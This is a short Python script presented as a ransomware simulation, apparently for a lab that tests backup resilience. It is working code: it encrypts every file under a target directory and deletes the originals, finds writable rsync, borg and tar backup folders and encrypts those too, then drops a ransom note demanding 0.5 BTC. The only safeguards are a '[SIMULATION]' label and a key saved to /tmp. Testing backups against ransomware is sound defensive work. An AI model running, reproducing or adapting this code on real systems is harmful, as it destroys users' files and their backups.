#!/usr/bin/env python3
import os, logging
from pathlib import Path
from cryptography.fernet import Fernet

logging.basicConfig(level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.FileHandler('/tmp/sim.log'),
              logging.StreamHandler()])
log = logging.getLogger(__name__)
KEY = Fernet.generate_key()
CIPHER = Fernet(KEY)

def encrypt_file(f):
    try:
        data = open(f,'rb').read()
        open(str(f)+'.locked','wb').write(CIPHER.encrypt(data))
        os.remove(f)
        log.info(f'ENCRYPTED: {f}')
        return True
    except PermissionError:
        log.warning(f'DENIED: {f}')
        return False

def attack_backup(path):
    p = Path(path)
    if not p.exists():
        log.info(f'NOT FOUND (unreachable): {path}')
        return
    try:
        t = p / 'TEST.tmp'
        open(t,'w').write('x'); os.remove(t)
        log.warning(f'BACKUP VULNERABLE: {path}')
        count = sum(1 for f in p.rglob('*')
                    if f.is_file()
                    and not str(f).endswith('.locked')
                    and encrypt_file(f))
        log.warning(f'BACKUP DESTROYED: {count} files in {path}')
    except PermissionError:
        log.info(f'BACKUP PROTECTED: {path}')

BACKUPS = [
    '/backup/rsync_backup',
    '/backup/borg_local',
    '/backup/tar_backup',
    'borguser@192.168.56.20:/store/borg_remote',  # удалённый — недостижим
]
TARGET = '/home/testuser/important_data'

log.info('=== SIMULATION STARTED ===')
open('/tmp/key.key','wb').write(KEY)
for b in BACKUPS: attack_backup(b)
enc = total = 0
for f in Path(TARGET).rglob('*'):
    if f.is_file() and not str(f).endswith('.locked'):
        total += 1
        if encrypt_file(f): enc += 1
Path(TARGET, 'README_DECRYPT.txt').write_text(
    '!!! PAY 0.5 BTC [SIMULATION] !!!')
log.info(f'=== DONE: {enc}/{total} encrypted ===')
